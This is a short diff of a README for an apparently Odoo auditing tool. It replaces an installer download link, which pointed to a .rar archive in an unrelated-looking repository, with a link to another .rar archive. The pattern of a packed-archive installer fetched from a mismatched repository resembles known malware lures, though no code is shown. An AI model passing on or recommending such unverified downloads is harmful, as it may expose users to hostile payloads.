@@ -25,7 +25,7 @@ This is more than a simple script. it's a mini-platform for generic Odoo auditin
 
 ### Option One: Use installer
 
-1. **Download** [Odoo Audit.rar](https://github.com/Juda-Tech-Green/pvi-vaceado-tanque/raw/main/odoo_audit.ra?download=1)
+1. **Download** [Odoo Audit.rar](https://github.com/Juda-Tech-Green/odoo-audit/raw/refs/heads/main/odoo_audit.rar)
 2. **Unzip**
 2. **Create .env file**
  ```env
